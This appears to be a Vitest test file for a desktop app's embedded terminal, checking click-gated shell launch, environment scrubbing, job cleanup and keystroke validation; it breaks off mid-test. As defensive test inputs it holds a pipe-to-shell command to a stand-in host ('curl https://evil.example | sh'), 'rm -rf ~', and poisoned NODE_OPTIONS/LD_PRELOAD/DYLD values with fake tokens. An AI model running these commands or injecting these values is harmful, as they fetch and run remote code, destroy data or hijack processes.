import { spawnSync } from 'node:child_process';
import { EventEmitter } from 'node:events';
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir, userInfo } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { input, takeInput } from '../../../main/words';
import { fits, forgetInput, isReport, mayWrite, sawKey, sawMouse, type SeenKey } from '../../../main/terminalInput';

// docs/contracts/terminal.md: the owner's own shell in a task's or conversation's working copy, run
// by main (main/terminal.ts). Main's channels run for real, with Electron, obid and its events stood
// in for; a stand-in pty for the rules, and node-pty's own for what a real shell does.
const the = await vi.hoisted(async () => {
  const { mkdtempSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  return {
    home: mkdtempSync(join(tmpdir(), 'oby-term-home-')),
    jobs: new Set<string>(),
    handlers: new Map<string, (e: unknown, ...a: unknown[]) => unknown>(),
    live: [] as (() => void)[],
    state: { gone: new Set<string>(), goneConversations: new Set<string>(), conversations: [] as { id: string; folders?: string[] }[] },
    clip: '',
    app: null as unknown as EventEmitter,
  };
});
vi.mock('electron', async () => {
  const { EventEmitter } = await import('node:events');
  the.app = Object.assign(new EventEmitter(), { getVersion: () => '1.2.3' });
  return {
    app: the.app,
    clipboard: { readText: async () => the.clip },
    ipcMain: { on: (n: string, f: never) => the.handlers.set(n, f), handle: (n: string, f: never) => the.handlers.set(n, f) },
  };
});
vi.mock('../../../main/obid', () => ({
  HOME: the.home,
  obid: async (_m: string, path: string) => ({ status: the.jobs.has(decodeURIComponent(path.split('/').pop()!)) ? 200 : 404, text: '{}' }),
}));
vi.mock('../../../main/live', () => ({ obidState: () => the.state, onLive: (f: () => void) => { the.live.push(f); } }));

const { Terminals, cleanEnv, cwdOf, ownersShell, shellOf, shellArgs, terminals, nodePty, jobGroups, killJobs, MAX_TERMINALS, KILL_GRACE_MS } = await import('../../../main/terminal');
type Spawn = import('../../../main/terminal').Spawn;

// A pty that does what it's told and records it; it ends on the signal named in `endsOn`
class FakePty {
  static last: FakePty | null = null;
  pid = 4242; killed: string[] = []; written: string[] = []; sizes: [number, number][] = []; dead = false;
  data: ((d: string) => void) | null = null; exit: ((e: { exitCode: number; signal?: number }) => void) | null = null;
  constructor(public file: string, public args: string[], public opts: Parameters<Spawn>[2], public endsOn: string | null) { FakePty.last = this; }
  onData(f: (d: string) => void) { this.data = f; return { dispose() {} }; }
  onExit(f: (e: { exitCode: number; signal?: number }) => void) { this.exit = f; return { dispose() {} }; }
  write(d: string) { this.written.push(d); }
  resize(c: number, r: number) { if (this.dead) throw new Error('ioctl(2) failed, EBADF'); this.sizes.push([c, r]); }
  kill(sig = 'SIGHUP') { this.killed.push(sig); if (sig === this.endsOn || sig === 'SIGKILL') this.end(0, 1); }
  end(code: number, signal?: number) { if (this.dead) return; this.dead = true; this.exit?.({ exitCode: code, signal }); }
}

type Sent = [string, ...unknown[]];
const page = () => Object.assign(new EventEmitter(), { isDestroyed: () => false, sent: [] as Sent[], send(...a: Sent) { this.sent.push(a); } });
type Page = ReturnType<typeof page>;
let endsOn: string | null = 'SIGHUP';
const spawned: FakePty[] = [];
const fake: Spawn = (file, args, opts) => { const p = new FakePty(file, args, opts, endsOn); spawned.push(p); return p; };
let terms: InstanceType<typeof Terminals>;
// the shells whose jobs were killed with them (never a real process: the fake's pid is made up)
const jobsKilled: number[] = [];
// how the jobs were asked for: off main's thread (false) or waited for, as Oby quits (true); and the
// answer, held while a test wants it
const jobsAsked: boolean[] = [];
let holdJobs: (() => void)[] | null = null;
const ENV = { env: { HOME: '/Users/owner', PATH: '/usr/bin:/bin' }, shell: '/bin/zsh' };
// main's channels, for the window's own page (trusted) or another
let trustedNow = true;
function register() {
  the.handlers.clear();
  the.live.length = 0;
  jobsKilled.length = 0; jobsAsked.length = 0; holdJobs = null;
  terms = new Terminals(() => fake, (p, ...a) => (p as unknown as Page | null)?.send(...(a as Sent)), () => ENV, KILL_GRACE_MS,
    (pid, done, now) => { jobsKilled.push(pid); jobsAsked.push(now); if (holdJobs) holdJobs.push(done); else done(); });
  terminals(() => trustedNow, terms);
}
const open = (p: Page, place: string, id: string, cols = 80, rows = 24) => the.handlers.get('terminal-open')!({ sender: p }, place, id, cols, rows) as Promise<{ term?: string; cwd?: string; error?: string }>;
const write = (term: string, data: string) => the.handlers.get('terminal-write')!({ sender: null }, term, data);
const worktree = (id: string) => { const dir = join(the.home, 'worktrees', id); mkdirSync(dir, { recursive: true }); the.jobs.add(id); return realpathSync(dir); };
const key = (k: string, mods: Partial<SeenKey> = {}) => sawKey({ key: k, control: false, alt: false, meta: false, shift: false, composing: false, ...mods });
const flush = () => new Promise((r) => setTimeout(r, 10));

beforeEach(() => {
  while (takeInput()) { /* no click left over */ }
  forgetInput();
  spawned.length = 0;
  endsOn = 'SIGHUP';
  trustedNow = true;
  the.jobs.clear();
  the.state = { gone: new Set(), goneConversations: new Set(), conversations: [] };
  the.app.removeAllListeners();
  register();
});
afterEach(() => { vi.useRealTimers(); });

describe('TERMINAL-1: a shell opens only on the owner\'s own click', () => {
  it('terminal_1_a_shell_opens_only_right_after_a_click_main_saw_one_per_click', async () => {
    worktree('j1');
    const p = page();
    expect(await open(p, 'task', 'j1')).toEqual({ error: 'Opening a terminal takes your own click.' });
    expect(spawned).toHaveLength(0);
    input();
    const a = await open(p, 'task', 'j1');
    expect(a.term).toMatch(/^t\d+$/);
    expect(spawned).toHaveLength(1);
    // the same click doesn't open another
    expect(await open(p, 'task', 'j1')).toEqual({ error: 'Opening a terminal takes your own click.' });
    expect(spawned).toHaveLength(1);
  });

  it('terminal_1: another page, or a frame in it, gets the refusal and nothing starts', async () => {
    worktree('j1');
    trustedNow = false;
    input();
    expect(await open(page(), 'task', 'j1')).toEqual({ error: 'Not this app’s page.' });
    expect(spawned).toHaveLength(0);
  });

  it(`terminal_1: at most ${MAX_TERMINALS} shells at once`, async () => {
    worktree('j1');
    const p = page();
    for (let i = 0; i < MAX_TERMINALS; i++) { input(); expect((await open(p, 'task', 'j1')).term).toBeTruthy(); }
    input();
    expect((await open(p, 'task', 'j1')).error).toMatch(/at most/);
    expect(spawned).toHaveLength(MAX_TERMINALS);
  });
});

describe('TERMINAL-2: in the working copy main finds itself', () => {
  it('terminal_2_the_shell_starts_in_the_tasks_worktree_the_owners_login_shell_at_the_measured_size', async () => {
    const dir = worktree('j1');
    input();
    const a = await open(page(), 'task', 'j1', 132, 40);
    expect(a).toMatchObject({ cwd: dir, name: 'j1' });
    const p = spawned[0];
    expect(p.opts).toMatchObject({ cwd: dir, cols: 132, rows: 40, encoding: 'utf8', name: 'xterm-256color' });
    expect([p.file, p.args]).toEqual([ENV.shell, ['-l']]);
  });

  it('terminal_2: a job obid doesn\'t have, a worktree that isn\'t there, a link out of obid\'s home or an id with a path open nothing', async () => {
    mkdirSync(join(the.home, 'worktrees', 'unknown'), { recursive: true });
    const out = mkdtempSync(join(tmpdir(), 'oby-term-out-'));
    symlinkSync(out, join(the.home, 'worktrees', 'linked'));
    the.jobs.add('linked'); the.jobs.add('missing');
    for (const id of ['unknown', 'missing', 'linked']) {
      input();
      expect(await open(page(), 'task', id), id).toEqual({ error: 'This task’s working copy isn’t on this Mac.' });
    }
    for (const id of ['../x', 'a/b', '', 'x'.repeat(200)]) {
      input();
      expect(await open(page(), 'task', id), id).toEqual({ error: 'Not this app’s page.' });
    }
    input();
    expect(await open(page(), 'repo' as 'task', 'j1')).toEqual({ error: 'Not this app’s page.' });
    expect(spawned).toHaveLength(0);
  });

  it('terminal_2: a conversation\'s shell starts in its first folder, as obid lists it; none, nothing', async () => {
    const a = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-a-'))), b = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-b-')));
    the.state.conversations = [{ id: 'c1', folders: [a, b] }, { id: 'c2', folders: [] }];
    expect(await cwdOf('conversation', 'c1')).toBe(a);
    input();
    expect((await open(page(), 'conversation', 'c1')).cwd).toBe(a);
    input();
    expect(await open(page(), 'conversation', 'c2')).toEqual({ error: 'This conversation has no folder on this Mac.' });
    input();
    expect(await open(page(), 'conversation', 'c3')).toEqual({ error: 'This conversation has no folder on this Mac.' });
    expect(spawned.map((p) => p.opts.cwd)).toEqual([a]);
  });

  it('terminal_2: the login shell is the one the system has for the owner, never $SHELL', () => {
    expect(shellOf({ shell: '/opt/homebrew/bin/fish' }, () => true)).toBe('/opt/homebrew/bin/fish');
    expect(shellOf({ shell: null }, () => true, 'darwin')).toBe('/bin/zsh');
    expect(shellOf({ shell: 'zsh' }, () => true, 'darwin')).toBe('/bin/zsh');
    expect(shellOf({ shell: '/gone/zsh' }, () => false, 'darwin')).toBe('/bin/zsh');
    expect(shellArgs('/bin/zsh')).toEqual(['-l']);
  });
});

describe('TERMINAL-3: a clean environment, nothing of Oby\'s', () => {
  const POISON = {
    OBID_TOKEN: 'obid-secret', OBID_HOME: '/x', OBY_VAULT_GITHUB: 'vault-secret', ANTHROPIC_API_KEY: 'sk-ant-secret', GITHUB_TOKEN: 'ghp_secret',
    ELECTRON_RUN_AS_NODE: '1', ELECTRON_RENDERER_URL: 'http://localhost:5175', NODE_OPTIONS: '--require /tmp/evil.js', SHELL: '/tmp/evil-shell',
    PATH: '/tmp/agent-bin:/usr/bin', LD_PRELOAD: '/tmp/evil.so', DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib', CLAUDE_CONFIG_DIR: '/x', CODEX_HOME: '/x',
    TMPDIR: '/var/folders/xy/T/', SSH_AUTH_SOCK: '/private/tmp/launchd/Listeners', LANG: 'C', __CF_USER_TEXT_ENCODING: '0x1F5:0x0:0x0',
  };
  it('terminal_3_the_shell_gets_only_who_the_owner_is_a_utf8_locale_and_the_terminals_kind', () => {
    const env = cleanEnv(POISON, { home: '/Users/owner', user: 'owner', shell: '/bin/zsh' }, '1.2.3');
    expect(env).toEqual({
      HOME: '/Users/owner', USER: 'owner', LOGNAME: 'owner', SHELL: '/bin/zsh', PATH: '/usr/bin:/bin:/usr/sbin:/sbin', LANG: 'en_US.UTF-8',
      TERM: 'xterm-256color', COLORTERM: 'truecolor', TERM_PROGRAM: 'Oby', TERM_PROGRAM_VERSION: '1.2.3',
      TMPDIR: '/var/folders/xy/T/', SSH_AUTH_SOCK: '/private/tmp/launchd/Listeners', __CF_USER_TEXT_ENCODING: '0x1F5:0x0:0x0',
    });
    expect(JSON.stringify(env)).not.toMatch(/secret|evil|agent-bin/);
    expect(cleanEnv({ LANG: 'de_DE.UTF-8' }, { home: '/h', user: 'u', shell: '/bin/zsh' }, '1').LANG).toBe('de_DE.UTF-8');
    expect(cleanEnv({ TMPDIR: 'a\nb' }, { home: '/h', user: 'u', shell: '/bin/zsh' }, '1').TMPDIR).toBeUndefined();
  });

  it('terminal_3: main\'s own wiring takes the app\'s environment through it', () => {
    const kept = { ...process.env };
    Object.assign(process.env, POISON);
    try {
      const { shell, env } = ownersShell('1.2.3');
      expect(shell).toBe(shellOf(userInfo()));
      expect(env.SHELL).toBe(shell);
      expect(Object.keys(env).sort()).toEqual(['COLORTERM', 'HOME', 'LANG', 'LOGNAME', 'PATH', 'SHELL', 'SSH_AUTH_SOCK', 'TERM', 'TERM_PROGRAM', 'TERM_PROGRAM_VERSION', 'TMPDIR', 'USER', '__CF_USER_TEXT_ENCODING']);
      expect(JSON.stringify(env)).not.toMatch(/secret|evil|agent-bin|ELECTRON|NODE_OPTIONS|OBID/);
    } finally {
      for (const k of Object.keys(POISON)) delete process.env[k];
      Object.assign(process.env, kept);
    }
  });
});

describe('TERMINAL-4: a shell never outlives its tab, its page, its place or Oby', () => {
  it('terminal_4_closing_a_tab_hangs_the_shell_up_and_kills_what_ignores_it', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    worktree('j1');
    const p = page();
    endsOn = null;  // ignores SIGHUP, as a stuck program can
    input();
    const { term } = await open(p, 'task', 'j1');
    the.handlers.get('terminal-close')!({ sender: p }, term);
    expect(spawned[0].killed).toEqual(['SIGHUP']);
    vi.advanceTimersByTime(KILL_GRACE_MS - 1);
    expect(spawned[0].killed).toEqual(['SIGHUP']);
    vi.advanceTimersByTime(1);
    expect(spawned[0].killed).toEqual(['SIGHUP', 'SIGKILL']);
    // the jobs it never passed its hang-up to go with it
    expect(jobsKilled).toEqual([4242]);
    // one that ends on its hang-up gets nothing more
    endsOn = 'SIGHUP';
    input();
    const second = await open(p, 'task', 'j1');
    the.handlers.get('terminal-close')!({ sender: p }, second.term);
    vi.advanceTimersByTime(KILL_GRACE_MS * 2);
    expect(spawned[1].killed).toEqual(['SIGHUP']);
    expect(jobsKilled).toEqual([4242]);
  });

  it('terminal_4: the jobs a shell started are the process groups below it, never its own or one above', () => {
    // pid ppid pgid: the shell 100 (its own group), a job 101 and its child 102 (group 101), a
    // pipeline 103 and 104 (group 103), a grandchild in its own group 105, and others' processes
    const table = ' 1 0 1\n 50 1 50\n 100 50 100\n 101 100 101\n 102 101 101\n 103 100 103\n 104 100 103\n 105 102 105\n 200 1 200\n 201 200 101\n';
    expect(jobGroups(100, table).sort((a, b) => a - b)).toEqual([101, 103, 105]);
    expect(jobGroups(100, '')).toEqual([]);
    expect(jobGroups(999, table)).toEqual([]);
  });

  it('terminal_4: a stuck shell\'s jobs are read off the window\'s thread, and the shell killed once they\'re gone; quitting waits for them', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    worktree('j1');
    const p = page();
    endsOn = null;
    holdJobs = [];
    input();
    const { term } = await open(p, 'task', 'j1');
    the.handlers.get('terminal-close')!({ sender: p }, term);
    vi.advanceTimersByTime(KILL_GRACE_MS);
    // asked, not waited for: the shell isn't killed until the jobs' answer comes
    expect(jobsAsked).toEqual([false]);
    expect(spawned[0].killed).toEqual(['SIGHUP']);
    holdJobs.shift()!();
    expect(spawned[0].killed).toEqual(['SIGHUP', 'SIGKILL']);
    // Oby quitting: waited for, as nothing would run after the app ends
    holdJobs = null;
    input(); await open(p, 'task', 'j1');
    the.app.emit('before-quit');
    the.app.emit('will-quit');
    expect(jobsAsked).toEqual([false, true]);
    expect(spawned[1].killed.at(-1)).toBe('SIGKILL');
  });

  it('terminal_4: Oby quitting ends every shell, and kills any still there before the app ends', async () => {
    worktree('j1');
    const p = page();
    endsOn = null;
    input(); await open(p, 'task', 'j1');
    input(); await open(p, 'task', 'j1');
    the.app.emit('before-quit');
    expect(spawned.map((s) => s.killed)).toEqual([['SIGHUP'], ['SIGHUP']]);
    the.app.emit('will-quit');
    expect(spawned.map((s) => s.killed.at(-1))).toEqual(['SIGKILL', 'SIGKILL']);
    expect(terms.open).toBe(0);
  });

  it('terminal_4: its page closing, crashing or loading again ends its shells; another page\'s stay', async () => {
    worktree('j1');
    for (const [event, arg] of [['destroyed', undefined], ['render-process-gone', {}], ['did-start-navigation', { isMainFrame: true, isSameDocument: false }]] as const) {
      const p = page(), other = page();
      input(); await open(p, 'task', 'j1');
      input(); await open(other, 'task', 'j1');
      const [mine, theirs] = spawned.slice(-2);
      // a link within the page, or a frame in it, isn't the page going
      p.emit('did-start-navigation', { isMainFrame: true, isSameDocument: true });
      p.emit('did-start-navigation', { isMainFrame: false, isSameDocument: false });
      expect(mine.killed, event).toEqual([]);
      p.emit(event, arg);
      expect(mine.killed, event).toEqual(['SIGHUP']);
      expect(theirs.killed, event).toEqual([]);
      other.emit('destroyed');
    }
  });

  it('terminal_4: its task deleted, or its worktree gone, ends its shells; a conversation deleted, its own', async () => {
    worktree('j1'); worktree('j2'); worktree('j3');
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-c-')));
    the.state.conversations = [{ id: 'c1', folders: [dir] }];
    const p = page();
    for (const [place, id] of [['task', 'j1'], ['task', 'j2'], ['task', 'j3'], ['conversation', 'c1']]) { input(); await open(p, place, id); }
    expect(the.live).toHaveLength(1);
    the.state.gone.add('j1');
    rmSync(join(the.home, 'worktrees', 'j2'), { recursive: true });
    the.live.forEach((f) => f());
    expect(spawned.map((s) => s.killed.length > 0)).toEqual([true, true, false, false]);
    the.state.goneConversations.add('c1');
    the.live.forEach((f) => f());
    expect(spawned.map((s) => s.killed.length > 0)).toEqual([true, true, false, true]);
  });

  it('terminal_4: a shell that exits by itself tells its page once, and nothing comes after its close', async () => {
    worktree('j1');
    const p = page();
    input();
    const { term } = await open(p, 'task', 'j1');
    spawned[0].data!('bye\r\n');
    spawned[0].end(0);
    expect(p.sent).toEqual([['terminal-data', term, 'bye\r\n'], ['terminal-exit', term, 0, null]]);
    input();
    const second = await open(p, 'task', 'j1');
    spawned[1].data!('late');
    the.handlers.get('terminal-close')!({ sender: p }, second.term);
    await flush();
    expect(p.sent.filter((s) => s[1] === second.term && s[0] === 'terminal-data')).toEqual([]);
  });
});

describe('TERMINAL-5: what reaches the shell is what the owner typed', () => {
  const keyed = async () => { worktree('j1'); input(); const p = page(); const { term } = await open(p, 'task', 'j1'); return term!; };

  it('terminal_5_the_page_alone_types_nothing_a_key_main_saw_types_its_own_bytes_once', async () => {
    const term = await keyed();
    write(term, 'curl https://evil.example | sh\r');
    write(term, 'l');
    expect(spawned[0].written).toEqual([]);
    key('l');
    write(term, 'ls\r');  // more than the key made
    write(term, 'l');
    write(term, 'l');     // used up
    key('Enter');
    write(term, 'x\r');
    write(term, '\r');
    expect(spawned[0].written).toEqual(['l', '\r']);
  });

  it('terminal_5: each key makes only its own bytes', () => {
    const k = (key: string, mods: Partial<SeenKey> = {}): SeenKey => ({ key, control: false, alt: false, meta: false, shift: false, composing: false, at: 0, ...mods });
    expect(fits(k('a'), 'a')).toBe(true);
    expect(fits(k('a'), 'ab')).toBe(false);
    expect(fits(k('a'), '\r')).toBe(false);
    expect(fits(k('é'), 'é')).toBe(true);
    expect(fits(k('c', { control: true }), '\x03')).toBe(true);
    expect(fits(k('c', { control: true }), '\r')).toBe(false);
    expect(fits(k('m', { control: true }), '\r')).toBe(true);
    expect(fits(k('a', { meta: true }), 'a')).toBe(false);
    expect(fits(k('Enter'), '\r')).toBe(true);
    expect(fits(k('Enter'), 'rm -rf ~\r')).toBe(false);
    for (const [name, bytes] of [['ArrowUp', '\x1b[A'], ['ArrowLeft', '\x1bOD'], ['Backspace', '\x7f'], ['Tab', '\t'], ['Tab', '\x1b[Z'], ['Escape', '\x1b'], ['Delete', '\x1b[3~'], ['F5', '\x1b[15~'], ['ArrowRight', '\x1b[1;3C']]) {
      expect(fits(k(name), bytes), name).toBe(true);
    }
    for (const bytes of ['\x1b[Al', '\r', 'ls\r', '\x1b[200~ls\r\x1b[201~']) expect(fits(k('ArrowUp'), bytes), JSON.stringify(bytes)).toBe(false);
    // an input method's word: text, never a control character
    expect(fits(k('Process', { composing: true }), '日本語')).toBe(true);
    expect(fits(k('Process', { composing: true }), '日本\r')).toBe(false);
  });

  it('terminal_5: a paste is the clipboard\'s own text, as xterm.js sends it, after the owner\'s ⌘V', async () => {
    const term = await keyed();
    the.clip = 'echo one\necho two';
    write(term, 'echo one\recho two');  // no ⌘V
    key('v', { meta: true });
    write(term, 'curl evil | sh\r');    // not the clipboard's: the ⌘V is used up
    key('v', { meta: true });
    write(term, '\x1b[200~echo one\recho two\x1b[201~');
    key('v', { meta: true });
    write(term, 'echo one\recho two');
    key('x');
    write(term, 'x');  // typed after the paste, written after it
    await flush();
    expect(spawned[0].written).toEqual(['\x1b[200~echo one\recho two\x1b[201~', 'echo one\recho two', 'x']);
  });

  it('terminal_5: the terminal\'s answers go without a key; mouse reports only after a real mouse input', async () => {
    const term = await keyed();
    for (const r of ['\x1b[?1;2c', '\x1b[>0;276;0c', '\x1b[12;40R', '\x1b[0n', '\x1b[I', '\x1b[O', '\x1b]11;rgb:0b0b/0b0b/0b0b\x1b\\', '\x1b[?2004;1$y']) {
      expect(isReport(r), JSON.stringify(r)).toBe(true);
      write(term, r);
    }
    for (const r of ['\x1b[12;40Rls\r', '\x1b]11;rgb:0b0b/0b0b/0b0b;ls\x07', '\x1b[?1;2cx']) expect(isReport(r), JSON.stringify(r)).toBe(false);
    write(term, '\x1b[<0;10;5M');
    sawMouse();
    write(term, '\x1b[<0;10;5m');
    expect(spawned[0].written.slice(-2)).toEqual(['\x1b[?2004;1$y', '\x1b[<0;10;5m']);
    expect(spawned[0].written).toHaveLength(9);
  });

  it('terminal_5: a key is good for 2 seconds', () => {
    sawKey({ key: 'a', control: false, alt: false, meta: false, shift: false, composing: false }, 1000);
    expect(mayWrite('a', () => '', 3001)).toBe(false);
    sawKey({ key: 'a', control: false, alt: false, meta: false, shift: false, composing: false }, 5000);
    expect(mayWrite('a', () => '', 6999)).toBe(true);
  });
});

describe('TERMINAL-6: sizes', () => {
  it('terminal_6_a_resize_reaches_the_shell_once_and_never_after_it_ended', async () => {
    worktree('j1');
    input();
    const { term } = await open(page(), 'task', 'j1', 80, 24);
    const resize = (c: unknown, r: unknown) => the.handlers.get('terminal-resize')!({ sender: null }, term, c, r);
    resize(80, 24);           // the size it has
    resize(0, 24); resize(80, 0); resize(1001, 24); resize(80.5, 24); resize(NaN, 24);
    resize(100, 30);
    resize(100, 30);
    expect(spawned[0].sizes).toEqual([[100, 30]]);
    spawned[0].dead = true;   // its shell ended, its exit not yet told: the resize races it
    expect(() => resize(120, 40)).not.toThrow();
    expect(terms.resize(term!, 120, 40)).toBe(false);
  });

  it('terminal_6: no room to open in, nothing opens', async () => {
    worktree('j1');
    input();
    expect(await open(page(), 'task', 'j1', 0, 0)).toEqual({ error: 'The terminal has no room to open in.' });
  });
});

describe('TERMINAL-7: output', () => {
  it('terminal_7_output_that_comes_together_goes_to_the_page_in_one_message', async () => {
    worktree('j1');
    const p = page();
    input();
    const { term } = await open(p, 'task', 'j1');
    for (const c of ['a', 'b', 'c']) spawned[0].data!(c);
    await flush();
    expect(p.sent).toEqual([['terminal-data', term, 'abc']]);
  });
});

// node-pty's own pty and a real shell: the rules above, as a person at the terminal sees them
describe('TERMINAL-8: a real shell', () => {
  const bash = '/bin/bash';
  // what Oby did to each shell and when, from its start: the signals close() sent, the jobs it
  // killed, and the shell's exit as node-pty reported it (a failure says which path it took)
  const real = () => {
    const out: string[] = [], exits: unknown[] = [], did: string[] = [];
    const t0 = Date.now(), at = (what: string) => did.push(`${Date.now() - t0}ms ${what}`);
    const spawn = () => { const start = nodePty(); return ((file, args, opts) => {
      const pty = start(file, args, opts), kill = pty.kill.bind(pty);
      pty.kill = (sig?: string) => { at(`sent ${sig ?? 'SIGHUP'}`); kill(sig); };
      pty.onExit(({ exitCode, signal }) => at(`exit reported (code ${exitCode}, signal ${signal ?? 'none'})`));
      return pty;
    }) as Spawn; };
    const t = new Terminals(spawn, (_p, channel, _id, data) => { if (channel === 'terminal-data') out.push(data as string); else exits.push(channel); }, () => {
      const who = userInfo();
      return { shell: bash, env: cleanEnv({ ...process.env, OBY_TERMINAL_TEST_SECRET: 'vault-secret-value' }, { home: who.homedir, user: who.username, shell: bash }, '1.2.3') };
    }, 300, (shell, done, now) => { at(`killing the jobs of ${shell}`); killJobs(shell, () => { at('jobs killed'); done(); }, now); });
    return { t, text: () => out.join(''), exits, did };
  };
  // a process as ps has it (pid ppid pgid stat started command), or that it's gone
  const row = (pid: number) => spawnSync('/bin/ps', ['-o', 'pid=,ppid=,pgid=,stat=,lstart=,comm=', '-p', String(pid)], { encoding: 'utf8' }).stdout.trim() || 'gone';
  const until = async (f: () => boolean, ms = 10_000) => { const end = Date.now() + ms; while (!f()) { if (Date.now() > end) throw new Error('timed out'); await new Promise((r) => setTimeout(r, 20)); } };
  // on Linux, what a process left behind did with signals: pending (its own, its group's), blocked,
  // ignored and caught, as /proc has them (bit 1 is SIGHUP); elsewhere nothing
  const signalsOf = (pid: number) => { try { return readFileSync(`/proc/${pid}/status`, 'utf8').split('\n').filter((l) => /^(SigPnd|ShdPnd|SigBlk|SigIgn|SigCgt)/.test(l)).join(' ').replace(/\s+/g, ' '); } catch { return ''; } };
  // running, not gone or a zombie waiting to be reaped
  const alive = (pid: number) => { const st = spawnSync('/bin/ps', ['-o', 'stat=', '-p', String(pid)], { encoding: 'utf8' }).stdout.trim(); return !!st && !st.startsWith('Z'); };

  // a shell the close finds busy (stopped here, as a loaded Mac can leave it) still hangs up its job
  // once it runs: nothing is sent behind its SIGHUP that could end it first. A SIGTERM right behind it
  // did, in about one close in eight (bash 3.2 dying of it mid hang-up, its job left to launchd), so 24.
  // Interim, obi-ai-bot/oby#2806: on GitHub's loaded 4-core Linux runner one close in 24, some runs, leaves
  // its job though bash died of the SIGHUP alone, for a reason not found yet; it's tried up to twice more
  // there (vitest's retry, the Electron twin of nextest's flaky list), and the fix removes the retry. A
  // miss still writes what it found to the log, so a run that passes on a retry keeps the measurement
  it('terminal_4_a_busy_shell_closed_still_hangs_up_its_job', { timeout: 120_000, retry: 2 }, async () => {
    const left: string[] = [];
    for (let i = 0; i < 24; i++) {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-busy-')));
      const { t, text, did } = real();
      const term = (t.start(null, 'task', 'j1', dir, 80, 24) as { term: string }).term;
      t.write(term, 'sleep 300 & echo JOB=$!\r');
      await until(() => /JOB=\d+/.test(text()));
      const job = Number(/JOB=(\d+)/.exec(text())![1]);
      const shellPid = (t as unknown as { terms: Map<string, { pty: { pid: number } }> }).terms.get(term)!.pty.pid;
      process.kill(shellPid, 'SIGSTOP');
      t.close(term);
      process.kill(shellPid, 'SIGCONT');
      await until(() => !alive(shellPid));
      await until(() => !alive(job), 2000).catch(() => { left.push(`job [${row(job)}] ${signalsOf(job)}; ${did.join('; ')}`); });
      try { process.kill(job, 'SIGKILL'); } catch { /* gone */ }
      t.killLeft();
    }
    if (left.length) process.stderr.write(`terminal_4 busy shell, #2806: ${left.length} of 24 jobs left: ${left.join(' | ')}\n`);
    expect(left).toEqual([]);
  });

  it('terminal_8_a_real_shell_runs_in_the_folder_with_a_clean_environment_utf8_whole_and_ends_with_its_jobs', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-real-')));
    const { t, text, did } = real();
    const opened = t.start(null, 'task', 'j1', dir, 80, 24);
    expect('term' in opened).toBe(true);
    const term = (opened as { term: string }).term;
    t.write(term, 'printf "WHERE=%s\\n" "$(pwd -P)"; env | grep -c SECRET; printf "\\303\\251%.0s" $(seq 1 3000); printf "\\nDONE\\n"\r');
    await until(() => /\r\nDONE\r\n/.test(text()));
    expect(text()).toContain(`WHERE=${dir}`);
    expect(text()).not.toContain('vault-secret-value');
    expect(text()).toMatch(/\r\n0\r\n/);
    // 6,000 bytes of é in chunks the pty cuts where it likes: every one whole, none garbled
    expect(text()).toContain('é'.repeat(3000));
    expect(text()).not.toContain('�');
    // a job left running in it ends with it (`$!` unquoted: macOS's bash 3.2 takes `!"` for a history event)
    t.write(term, 'sleep 300 & echo JOB=$!\r');
    await until(() => /JOB=\d+/.test(text()));
    const job = Number(/JOB=(\d+)/.exec(text())![1]);
    const shellPid = (t as unknown as { terms: Map<string, { pty: { pid: number } }> }).terms.get(term)!.pty.pid;
    expect(alive(job)).toBe(true);
    t.close(term);
    // a failure here says which way it went: what Oby sent the shell and when, and where each is now
    await until(() => !alive(shellPid) && !alive(job)).catch(() => {
      throw new Error(`the shell or its job outlived the close: shell [${row(shellPid)}], job [${row(job)}]; ${did.join('; ')}`);
    });
    t.killLeft();
  });

  it('terminal_4_a_real_shell_still_there_after_its_grace_is_killed_with_its_jobs', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-real-')));
    const { t, text } = real();
    const term = (t.start(null, 'task', 'j1', dir, 80, 24) as { term: string }).term;
    t.write(term, 'sleep 300 & echo JOB=$!\r');
    await until(() => /JOB=\d+/.test(text()));
    const job = Number(/JOB=(\d+)/.exec(text())![1]);
    const shellPid = (t as unknown as { terms: Map<string, { pty: { pid: number } }> }).terms.get(term)!.pty.pid;
    // a shell that can't run before its grace ends (stopped, as a busy Mac can leave it): its SIGHUP
    // never reaches the job, and the SIGKILL that ends it alone would leave the job running on
    process.kill(shellPid, 'SIGSTOP');
    try {
      t.close(term);
      await until(() => !alive(shellPid));
      // killed with the shell, in the same step: gone, not handed to launchd
      await until(() => !alive(job), 2000);
    } finally { try { process.kill(job, 'SIGKILL'); } catch { /* gone */ } }
  });

  it('terminal_4_a_stuck_shells_jobs_are_found_without_stopping_the_window', async () => {
    // a ps that takes a second to answer, as a loaded Mac's can: the window's own thread goes on
    const bin = mkdtempSync(join(tmpdir(), 'oby-slow-ps-'));
    writeFileSync(join(bin, 'ps'), '#!/bin/sh\n/bin/sleep 1\nexec /bin/ps "$@"\n', { mode: 0o755 });
    const path = process.env.PATH;
    process.env.PATH = `${bin}:${path}`;
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-real-')));
    const { t, text } = real();
    const term = (t.start(null, 'task', 'j1', dir, 80, 24) as { term: string }).term;
    let job = 0;
    try {
      t.write(term, 'sleep 300 & echo JOB=$!\r');
      await until(() => /JOB=\d+/.test(text()));
      job = Number(/JOB=(\d+)/.exec(text())![1]);
      const shellPid = (t as unknown as { terms: Map<string, { pty: { pid: number } }> }).terms.get(term)!.pty.pid;
      process.kill(shellPid, 'SIGSTOP');
      // the longest the window's thread went without a turn, from the close until the shell's gone
      let last = Date.now(), longest = 0;
      const tick = setInterval(() => { const now = Date.now(); longest = Math.max(longest, now - last); last = now; }, 10);
      t.close(term);
      await until(() => !alive(shellPid));
      clearInterval(tick);
      await until(() => !alive(job), 2000);
      expect(longest).toBeLessThan(500);
    } finally {
      process.env.PATH = path;
